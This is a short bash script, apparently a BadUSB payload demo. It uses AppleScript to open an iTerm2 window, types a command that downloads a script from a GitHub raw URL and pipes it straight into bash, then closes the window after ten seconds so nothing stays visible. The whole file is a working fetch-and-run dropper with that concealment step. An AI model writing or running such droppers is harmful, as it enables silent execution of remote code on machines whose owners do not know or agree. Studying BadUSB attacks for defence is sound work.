#!/bin/bash

osascript<<EOD
    set theCommand to "curl -s -L https://raw.githubusercontent.com/moolibdensplk/BadUSBexample/main/make_moo.sh | bash"
    tell application "iTerm2"
        set newWindow to (create window with default profile)
        tell current session of newWindow
	    write text theCommand
	end tell
	delay 10
	close newWindow	
    end tell
EOD

